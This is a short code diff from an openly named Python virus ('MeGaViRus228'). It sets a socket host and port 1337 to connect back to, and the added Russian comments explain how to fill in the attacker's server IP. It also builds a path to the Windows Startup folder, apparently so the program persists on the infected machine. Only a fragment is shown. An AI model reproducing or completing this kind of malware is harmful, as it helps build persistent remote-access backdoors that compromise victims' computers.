@@ -7,7 +7,9 @@ def MeGaViRus228():
 
     import socket
 
-    HOST = '127.0.0.1'
+    HOST = '127.0.0.1'# WIN+R -> CMD -> IPCONFIG -> Ethernet adapter Ethernet ->  IPv4 Address
+                      # Или IP аддрес сервера
+    
     PORT = 1337
 
     auto_start_folder = os.getenv('APPDATA')[0:-8] + '\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
